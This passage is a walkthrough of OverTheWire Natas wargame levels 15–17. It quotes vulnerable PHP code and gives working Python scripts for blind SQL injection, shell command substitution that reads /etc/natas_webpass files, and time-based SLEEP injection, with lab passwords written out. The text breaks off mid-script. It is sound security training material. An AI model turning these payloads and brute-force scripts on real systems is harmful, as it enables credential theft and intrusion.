+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span>
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+    <span style="color:#111">$link</span> <span style="color:#f92672">=</span> <span style="color:#75af00">mysql_connect</span><span style="color:#111">(</span><span style="color:#d88200">&#39;localhost&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;natas15&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;&lt;censored&gt;&#39;</span><span style="color:#111">);</span>
+    <span style="color:#75af00">mysql_select_db</span><span style="color:#111">(</span><span style="color:#d88200">&#39;natas15&#39;</span><span style="color:#111">,</span> <span style="color:#111">$link</span><span style="color:#111">);</span>
+    
+    <span style="color:#111">$query</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;SELECT * from users where username=</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200">&#34;</span><span style="color:#f92672">.</span><span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">]</span><span style="color:#f92672">.</span><span style="color:#d88200">&#34;</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200">&#34;</span><span style="color:#111">;</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;debug&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_GET</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;Executing query: </span><span style="color:#d88200">$query</span><span style="color:#d88200">&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span>
+
+    <span style="color:#111">$res</span> <span style="color:#f92672">=</span> <span style="color:#75af00">mysql_query</span><span style="color:#111">(</span><span style="color:#111">$query</span><span style="color:#111">,</span> <span style="color:#111">$link</span><span style="color:#111">);</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#111">$res</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">mysql_num_rows</span><span style="color:#111">(</span><span style="color:#111">$res</span><span style="color:#111">)</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+            <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;This user exists.&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+        <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+            <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;This user doesn&#39;t exist.&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+        <span style="color:#111">}</span>
+    <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;Error in query.&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span>
+
+    <span style="color:#75af00">mysql_close</span><span style="color:#111">(</span><span style="color:#111">$link</span><span style="color:#111">);</span>
+<span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
+</span></code></pre></div><p>Again, there is no input sanitization, remember to always <a href="https://owasp.org/www-project-cheat-sheets/cheatsheets/Input_Validation_Cheat_Sheet">sanitize and validate</a> your inputs kids!</p>
+<p>So what we can do is escape the query and bruteforce the password,
+since page only tells us if the user exists or not,
+we can use wildcards to know which characters belong in the password!</p>
+<p>The simplest way to do this (and the slowest) is to use a query like the following:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00a8c8">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#00a8c8">FROM</span> <span style="color:#111">users</span> <span style="color:#00a8c8">WHERE</span> <span style="color:#111">username</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;natas16&#34;</span> <span style="color:#00a8c8">AND</span> <span style="color:#111">password</span> <span style="color:#00a8c8">LIKE</span> <span style="color:#d88200">&#34;&lt;password&gt;%&#34;</span>
+</code></pre></div><p>Where the <code>password</code> is a string of characters which we will be building incrementally.</p>
+<p>So what we need to do is:</p>
+<ul>
+<li>Escape the query</li>
+<li>Create our query</li>
+<li>Brute force password combinations</li>
+<li>Profit???</li>
+</ul>
+<p>Let&rsquo;s start with the query, we want to achieve the query from before, we can start by escaping it:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#111">natas16</span><span style="color:#d88200">&#34;
+</span></code></pre></div><p>Easy enough, right?
+Now we insert what we want to know:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#111">natas16</span><span style="color:#d88200">&#34; AND password LIKE &#34;</span><span style="color:#f92672">%</span>
+</code></pre></div><p>We do not end it with <code>&quot;</code> since we paired it with the first one after Natas,
+the PHP code will &ldquo;do it for us&rdquo;.</p>
+<p>There is one problem however!
+According to the MySQL documentation,
+string comparisons (in this case <a href="https://dev.mysql.com/doc/refman/5.7/en/string-comparison-functions.html#operator_like"><code>LIKE</code></a>) are not <a href="https://dev.mysql.com/doc/refman/8.0/en/case-sensitivity.html">case-sensitive</a> unless one of the operands is.</p>
+<p>A simple fix is to turn the input string into a <a href="https://dev.mysql.com/doc/refman/8.0/en/binary-varbinary.html">BINARY</a> string, effectively giving us case-sensitive matching:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#111">natas16</span><span style="color:#d88200">&#34; AND password LIKE BINARY &#34;</span><span style="color:#f92672">%</span>
+</code></pre></div><p>We have our query ready! Time to brute force the password!</p>
+<p>Before we jumping head-first let&rsquo;s go for a quick bruteforcing refresher.</p>
+<p><a href="https://owasp.org">OWASP</a> defines a <a href="https://owasp.org/www-community/attacks/Brute_force_attack">brute force attack</a> as the following:</p>
+<hr>
+<p><em>A brute force attack can manifest itself in many different ways, but primarily consists in an attacker configuring predetermined values, making requests to a server using those values, and then analyzing the response.</em></p>
+<p>For the sake of efficiency, an attacker may use a <strong>dictionary attack</strong> (with or without mutations) or a <strong>traditional brute-force attack</strong> (with given classes of characters e.g.: alphanumerical, special, case (in)sensitive).
+Considering a given method, number of tries, efficiency of the system which conducts the attack, and estimated efficiency of the system which is attacked the attacker is able to calculate approximately how long it will take to submit all chosen predetermined values.</p>
+<hr>
+<p>We don&rsquo;t really have a dictionary of passwords,
+and from the query we can establish that we will be testing character by character.
+Furthermore, we know the password should have 32 characters,
+and permuting them all would be really expensive
+(<em>32! = 2.6313083693369355e+35</em> and this would be if we already knew all the characters!).</p>
+<p><a href="https://xkcd.com/936/"><img src="https://imgs.xkcd.com/comics/password_strength.png" alt="Password Strength"></a></p>
+<p>So let us calculate how much tries we will be needing and how can we cut the cost!</p>
+<p>Our candidate set is composed of numbers 0 to 9 and ASCII characters, lower and upper case,
+a total of 62 characters.
+So for each place of the 32 character password we have 62 candidates!</p>
+<p>A total of <em>32 * 62 = 1984</em> iterations would be necessary in the worst case scenario!
+Not bad for a computer, they don&rsquo;t complain like humans do&hellip;</p>
+<p>Pretending that is too much we could do the following:</p>
+<p>Find for each character, if it belongs to the password, reducing the candidate set.
+Afterwards, just apply the same logic as before.</p>
+<p>Taking the level password we see that it has 24 distinct characters,
+this means we would need <em>24 * 62 = 1488</em> iterations to find the password (plus the 62 to setup)!</p>
+<p><em>To keep the script simple we will be ignoring this optimization.</em></p>
+<p><em><strong>Lesson over, let&rsquo;s start!</strong></em></p>
+<p>We will need two friends for our journey.
+<code>requests</code> for the web requests (duh!) and <code>string</code> because we are lazy and don&rsquo;t want to manually write down the candidates.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> <span style="color:#111">requests</span>
+<span style="color:#f92672">import</span> <span style="color:#111">string</span>
+</code></pre></div><p>Afterwards we define the target url, possible candidates,
+password &ldquo;buffer&rdquo; to which we will be appending characters that belong in the password and
+the query we will be formatting and using later.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#111">url</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;http://natas15.natas.labs.overthewire.org/index.php?debug&amp;username=&#34;</span>
+<span style="color:#111">candidates</span> <span style="color:#f92672">=</span> <span style="color:#111">f</span><span style="color:#d88200">&#34;{string.digits}{string.ascii_letters}&#34;</span>
+<span style="color:#111">password</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;&#34;</span>
+<span style="color:#111">query</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#39;natas16&#34; AND password LIKE BINARY &#34;{}%&#39;</span>
+</code></pre></div><p>Finally the loops. We know we have 32 characters and for each we need to test each character.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#00a8c8">for</span> <span style="color:#111">_</span> <span style="color:#f92672">in</span> <span style="color:#111">range</span><span style="color:#111">(</span><span style="color:#ae81ff">32</span><span style="color:#111">):</span>
+    <span style="color:#00a8c8">for</span> <span style="color:#111">c</span> <span style="color:#f92672">in</span> <span style="color:#111">candidates</span><span style="color:#111">:</span>
+</code></pre></div><p>We send a GET request to the site, authenticating on the way and building our query.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#111">resp</span> <span style="color:#f92672">=</span> <span style="color:#111">requests</span><span style="color:#f92672">.</span><span style="color:#111">get</span><span style="color:#111">(</span>
+            <span style="color:#111">url</span> <span style="color:#f92672">+</span> <span style="color:#111">query</span><span style="color:#f92672">.</span><span style="color:#111">format</span><span style="color:#111">(</span><span style="color:#111">password</span> <span style="color:#f92672">+</span> <span style="color:#111">c</span><span style="color:#111">),</span>
+            <span style="color:#111">auth</span><span style="color:#f92672">=</span><span style="color:#111">(</span><span style="color:#d88200">&#34;natas15&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">&#34;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#34;</span><span style="color:#111">),</span>
+        <span style="color:#111">)</span>
+</code></pre></div><p>Finally if the current character yields results, we append it to the password and do not test any more candidates for the current character index.</p>
+<p>This technique is also called <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">Blind SQL Injection</a>, since we do not get a direct response to our query!</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#00a8c8">if</span> <span style="color:#d88200">&#34;exists&#34;</span> <span style="color:#f92672">in</span> <span style="color:#111">resp</span><span style="color:#f92672">.</span><span style="color:#111">text</span><span style="color:#111">:</span>
+    <span style="color:#111">password</span> <span style="color:#f92672">+=</span> <span style="color:#111">c</span>
+    <span style="color:#00a8c8">print</span><span style="color:#111">(</span><span style="color:#111">password</span><span style="color:#111">)</span>
+    <span style="color:#00a8c8">break</span>
+</code></pre></div><p>Run the script and in no time you&rsquo;ll have your dear password for the next level!</p>
+<p>The final code looks like the following:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#111">url</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;http://natas15.natas.labs.overthewire.org/index.php?debug&amp;username=&#34;</span>
+<span style="color:#111">candidates</span> <span style="color:#f92672">=</span> <span style="color:#111">f</span><span style="color:#d88200">&#34;{string.digits}{string.ascii_letters}&#34;</span>
+<span style="color:#111">password</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;&#34;</span>
+<span style="color:#111">query</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#39;natas16&#34; AND password LIKE BINARY &#34;{}%&#39;</span>
+<span style="color:#00a8c8">for</span> <span style="color:#111">_</span> <span style="color:#f92672">in</span> <span style="color:#111">range</span><span style="color:#111">(</span><span style="color:#ae81ff">32</span><span style="color:#111">):</span>
+    <span style="color:#00a8c8">for</span> <span style="color:#111">c</span> <span style="color:#f92672">in</span> <span style="color:#111">candidates</span><span style="color:#111">:</span>
+        <span style="color:#111">resp</span> <span style="color:#f92672">=</span> <span style="color:#111">requests</span><span style="color:#f92672">.</span><span style="color:#111">get</span><span style="color:#111">(</span>
+            <span style="color:#111">url</span> <span style="color:#f92672">+</span> <span style="color:#111">query</span><span style="color:#f92672">.</span><span style="color:#111">format</span><span style="color:#111">(</span><span style="color:#111">password</span> <span style="color:#f92672">+</span> <span style="color:#111">c</span><span style="color:#111">),</span>
+            <span style="color:#111">auth</span><span style="color:#f92672">=</span><span style="color:#111">(</span><span style="color:#d88200">&#34;natas15&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">&#34;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#34;</span><span style="color:#111">),</span>
+        <span style="color:#111">)</span>
+        <span style="color:#00a8c8">if</span> <span style="color:#d88200">&#34;exists&#34;</span> <span style="color:#f92672">in</span> <span style="color:#111">resp</span><span style="color:#f92672">.</span><span style="color:#111">text</span><span style="color:#111">:</span>
+            <span style="color:#111">password</span> <span style="color:#f92672">+=</span> <span style="color:#111">c</span>
+            <span style="color:#00a8c8">print</span><span style="color:#111">(</span><span style="color:#111">password</span><span style="color:#111">)</span>
+            <span style="color:#00a8c8">break</span>
+</code></pre></div><h1 id="level-16">Level 16</h1>
+<p>This level is the bigger brother of Level 9. Now they have sanitization!
+Is it that scary? Let&rsquo;s see.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span>
+<span style="color:#111">$key</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;&#34;</span><span style="color:#111">;</span>
+
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;needle&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+    <span style="color:#111">$key</span> <span style="color:#f92672">=</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;needle&#34;</span><span style="color:#111">];</span>
+<span style="color:#111">}</span>
+
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#111">$key</span> <span style="color:#f92672">!=</span> <span style="color:#d88200">&#34;&#34;</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">preg_match</span><span style="color:#111">(</span><span style="color:#d88200">&#39;/[;|&amp;`\&#39;&#34;]/&#39;</span><span style="color:#111">,</span><span style="color:#111">$key</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">print</span> <span style="color:#d88200">&#34;Input contains an illegal character!&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+        <span style="color:#75af00">passthru</span><span style="color:#111">(</span><span style="color:#d88200">&#34;grep -i </span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200">$key\</span><span style="color:#d88200">&#34;</span> <span style="color:#75af00">dictionary</span><span style="color:#f92672">.</span><span style="color:#75af00">txt</span><span style="color:#d88200">&#34;);
+</span><span style="color:#d88200">    }
+</span><span style="color:#d88200">}
+</span><span style="color:#d88200">?&gt;
+</span></code></pre></div><p>They are using a <a href="https://en.wikipedia.org/wiki/Regular_expression">regex</a> to filter out strings.</p>
+<p><em>For the readers who don&rsquo;t know what regexes are, I highly sugest you read the above link and research on the topic, it will surely come in handy at some point in your life!</em></p>
+<p>The regex (<code>[;|&amp;\`\'&quot;]</code>) filters out the following characters:</p>
+<ul>
+<li>; - semi-colon</li>
+<li>| - pipe</li>
+<li>&amp; - ampersand</li>
+<li>` - backtick</li>
+<li>' - quote</li>
+<li>&quot; - double-quote</li>
+</ul>
+<p>So we can&rsquo;t really escape the command and do whatever we want, what should we do?</p>
+<p>Bash <a href="https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html">command substituion</a> to the rescue!</p>
+<p>The bash documentation states:</p>
+<p><em>Command substitution allows the output of a command to replace the command itself.</em></p>
+<p>How is this useful you ask? We can run a command before <code>grep</code> runs!</p>
+<p>This means we can pick a unique word from the list (which we can see using <code>.*</code>, more regex magic!),
+run a command substitution and get some output, or not!</p>
+<p>For example, the query command is:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">grep -i <span style="color:#d88200">&#34;some key&#34;</span> dictionary.txt
+</code></pre></div><p>If we use command substitution we can do the following:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">grep -i <span style="color:#d88200">&#34;weird word </span><span style="color:#d88200">${</span><span style="color:#111">grep</span><span style="color:#111"> </span><span style="color:#d88200">&#34;password character&#34;</span><span style="color:#111"> /etc/natas_webpass/natas17</span><span style="color:#d88200">}</span><span style="color:#d88200">&#34;</span> dictionary.txt
+</code></pre></div><p>If the substitution works it will return text, appending it to <code>weird word</code>, making it not match any text!
+we just need to watch out for empty results to know whether the character belongs in the password or not.</p>
+<p>Since we&rsquo;ve covered brute force attacks, I&rsquo;ll just show the code.
+The idea is the same as last time, the script just needs a bit of tweaking for the new &ldquo;query&rdquo;.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> <span style="color:#111">string</span>
+<span style="color:#f92672">import</span> <span style="color:#111">requests</span>
+
+<span style="color:#111">url</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;http://natas16.natas.labs.overthewire.org/index.php?debug&amp;needle=&#34;</span>
+<span style="color:#111">password</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;&#34;</span>
+<span style="color:#111">candidates</span> <span style="color:#f92672">=</span> <span style="color:#111">f</span><span style="color:#d88200">&#34;{string.ascii_letters}{string.digits}&#34;</span>
+
+<span style="color:#111">query</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;acknowledgements$(grep ^{} /etc/natas_webpass/natas17)&#34;</span>
+<span style="color:#00a8c8">for</span> <span style="color:#111">_</span> <span style="color:#f92672">in</span> <span style="color:#111">range</span><span style="color:#111">(</span><span style="color:#ae81ff">32</span><span style="color:#111">):</span>
+    <span style="color:#00a8c8">for</span> <span style="color:#111">c</span> <span style="color:#f92672">in</span> <span style="color:#111">candidates</span><span style="color:#111">:</span>
+        <span style="color:#111">resp</span> <span style="color:#f92672">=</span> <span style="color:#111">requests</span><span style="color:#f92672">.</span><span style="color:#111">get</span><span style="color:#111">(</span>
+            <span style="color:#111">url</span> <span style="color:#f92672">+</span> <span style="color:#111">query</span><span style="color:#f92672">.</span><span style="color:#111">format</span><span style="color:#111">(</span><span style="color:#111">password</span> <span style="color:#f92672">+</span> <span style="color:#111">c</span><span style="color:#111">),</span>
+            <span style="color:#111">auth</span><span style="color:#f92672">=</span><span style="color:#111">(</span><span style="color:#d88200">&#34;natas16&#34;</span><span style="color:#111">,</span> <span style="color:#d88200">&#34;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&#34;</span><span style="color:#111">),</span>
+        <span style="color:#111">)</span>
+        <span style="color:#00a8c8">if</span> <span style="color:#d88200">&#34;acknowledgements&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> <span style="color:#111">resp</span><span style="color:#f92672">.</span><span style="color:#111">text</span><span style="color:#111">:</span>
+            <span style="color:#111">password</span> <span style="color:#f92672">+=</span> <span style="color:#111">c</span>
+            <span style="color:#00a8c8">print</span><span style="color:#111">(</span><span style="color:#111">password</span><span style="color:#111">)</span>
+            <span style="color:#00a8c8">break</span>
+</code></pre></div><p>I picked <code>acknowledgements</code>, no real reason besides being unique and long.
+The script works just like Level 15.
+Test characters and add them to the password, in no time you&rsquo;ll be done.</p>
+<h1 id="level-17">Level 17</h1>
+<p><em>Disclaimer: If you&rsquo;re here because you&rsquo;re stuck, have no shame, for I also went and read up on the solution. It is not trivial for those starting to learn, so do not beat yourself up!</em></p>
+<p>Level 17 mixes Level 15 and 16, in that we will be doing more blind injections and that we can only check for existence.</p>
+<p>In fact, this is so blind that we don&rsquo;t even have output, take a look at the source code!</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span>
+<span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_REQUEST</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+    <span style="color:#111">$link</span> <span style="color:#f92672">=</span> <span style="color:#75af00">mysql_connect</span><span style="color:#111">(</span><span style="color:#d88200">&#39;localhost&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;natas17&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;&lt;censored&gt;&#39;</span><span style="color:#111">);</span>
+    <span style="color:#75af00">mysql_select_db</span><span style="color:#111">(</span><span style="color:#d88200">&#39;natas17&#39;</span><span style="color:#111">,</span> <span style="color:#111">$link</span><span style="color:#111">);</span>
+    
+    <span style="color:#111">$query</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;SELECT * from users where username=</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200">&#34;</span><span style="color:#f92672">.</span><span style="color:#111">$_REQUEST</span><span style="color:#111">[</span><span style="color:#d88200">&#34;username&#34;</span><span style="color:#111">]</span><span style="color:#f92672">.</span><span style="color:#d88200">&#34;</span><span style="color:#8045ff">\&#34;</span><span style="color:#d88200">&#34;</span><span style="color:#111">;</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">array_key_exists</span><span style="color:#111">(</span><span style="color:#d88200">&#34;debug&#34;</span><span style="color:#111">,</span> <span style="color:#111">$_GET</span><span style="color:#111">))</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">echo</span> <span style="color:#d88200">&#34;Executing query: </span><span style="color:#d88200">$query</span><span style="color:#d88200">&lt;br&gt;&#34;</span><span style="color:#111">;</span>
+    <span style="color:#111">}</span>
+
+    <span style="color:#111">$res</span> <span style="color:#f92672">=</span> <span style="color:#75af00">mysql_query</span><span style="color:#111">(</span><span style="color:#111">$query</span><span style="color:#111">,</span> <span style="color:#111">$link</span><span style="color:#111">);</span>
+    <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#111">$res</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+        <span style="color:#00a8c8">if</span><span style="color:#111">(</span><span style="color:#75af00">mysql_num_rows</span><span style="color:#111">(</span><span style="color:#111">$res</span><span style="color:#111">)</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+            <span style="color:#75715e">//echo &#34;This user exists.&lt;br&gt;&#34;;
+</span><span style="color:#75715e"></span>        <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+            <span style="color:#75715e">//echo &#34;This user doesn&#39;t exist.&lt;br&gt;&#34;;
+</span><span style="color:#75715e"></span>        <span style="color:#111">}</span>
+    <span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+        <span style="color:#75715e">//echo &#34;Error in query.&lt;br&gt;&#34;;
+</span><span style="color:#75715e"></span>    <span style="color:#111">}</span>
+
+    <span style="color:#75af00">mysql_close</span><span style="color:#111">(</span><span style="color:#111">$link</span><span style="color:#111">);</span>
+<span style="color:#111">}</span> <span style="color:#00a8c8">else</span> <span style="color:#111">{</span>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
+</span></code></pre></div><p>All <code>echo</code> calls are commented! How will we be able to know when the characters match?</p>
+<p>As usual, OWASP as got our back! <a href="https://www.owasp.org/images/a/a5/2018-02-05-AhmadAshraff.pdf">Timing-Based Attacks</a> FTW!</p>
+<p>&ldquo;Uhhhh, what is that?&rdquo; you might ask!</p>
+<hr>
+<p><em>Timing attack is a <a href="https://www.owasp.org/images/c/cd/Side_Channel_Vulnerabilities.pdf">side channel attack</a> which allows an attacker to retrieve potentially sensitive information from the web applications by observing the normal behavior of the response times.</em></p>
+<hr>
+<p>&ldquo;I&rsquo;m sold, how do we get started?&rdquo;</p>
+<p>With a SQL injection as usual! We get our usual query.</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00a8c8">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#00a8c8">FROM</span> <span style="color:#111">users</span> <span style="color:#00a8c8">WHERE</span> <span style="color:#111">username</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;natas18&#34;</span> <span style="color:#00a8c8">AND</span> <span style="color:#111">password</span> <span style="color:#00a8c8">LIKE</span> <span style="color:#111">BINARY</span> <span style="color:#d88200">&#34;%&#34;</span>
+</code></pre></div><p>But we&rsquo;ll be adding a secret ingredient, if you read <a href="https://www.owasp.org/images/a/a5/2018-02-05-AhmadAshraff.pdf#page=9">this</a> you know what it is, we will be using <a href="https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_sleep"><code>SLEEP</code></a>.</p>
+<p>What we want to do is to force correct queries to sleep for a given period of time, if the response takes at least that time to arrive it is because it most likely you have a hit (beware of network delays!).</p>
+<p>Our query now looks like:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#00a8c8">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#00a8c8">FROM</span> <span style="color:#111">users</span> <span style="color:#00a8c8">WHERE</span> <span style="color:#111">username</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;natas18&#34;</span> <span style="color:#00a8c8">AND</span> <span style="color:#111">password</span> <span style="color:#00a8c8">LIKE</span> <span style="color:#111">BINARY</span> <span style="color:#d88200">&#34;%&#34;</span> <span style="color:#00a8c8">AND</span> <span style="color:#111">SLEEP</span><span style="color:#111">(</span><span style="color:#ae81ff">1</span><span style="color:#111">)</span>
+</code></pre></div><p><em>Note: we now have a dangling <code>&quot;</code>, you can add <code>#</code> in order to comment it out from the query! Do not forget to URL encode it though!.</em></p>
+<p>Once more we need to adapt our little brute force script (maybe we could generalize it)?</p>
+<p><a href="https://www.xkcd.com/974/"><img src="https://imgs.xkcd.com/comics/the_general_problem.png" alt="The General Problem"></a></p>
+<p>At this point you should be tired of writing these and already be able to do it from memory,
+or not, I&rsquo;m not the one who should be doing the judgement.
+The code ends up looking like this:</p>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> <span style="color:#111">string</span>
+<span style="color:#f92672">import</span> <span style="color:#111">requests</span>
+<span style="color:#f92672">import</span> <span style="color:#111">time</span>
+
+<span style="color:#111">url</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;http://natas17.natas.labs.overthewire.org/index.php?debug&amp;username=&#34;</span>
+<span style="color:#111">password</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;&#34;</span>
+<span style="color:#111">candidates</span> <span style="color:#f92672">=</span> <span style="color:#111">f</span><span style="color:#d88200">&#34;{string.digits}{string.ascii_letters}&#34;</span>
+
+<span style="color:#111">query</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#39;natas18&#34; AND password LIKE BINARY &#34;{}%&#34; AND SLEEP(1)%23&#39;</span>
+<span style="color:#00a8c8">for</span> <span style="color:#111">_</span> <span style="color:#f92672">in</span> <span style="color:#111">range</span><span style="color:#111">(</span><span style="color:#ae81ff">32</span><span style="color:#111">):</span>
+    <span style="color:#00a8c8">for</span> <span style="color:#111">c</span> <span style="color:#f92672">in</span> <span style="color:#111">candidates</span><span style="color:#111">:</span>
+        <span style="color:#111">sent</span> <span style="color:#f92672">=</span> <span style="color:#111">time</span><span style="color:#f92672">.</span><span style="color:#111">time</span><span style="color:#111">()</span>
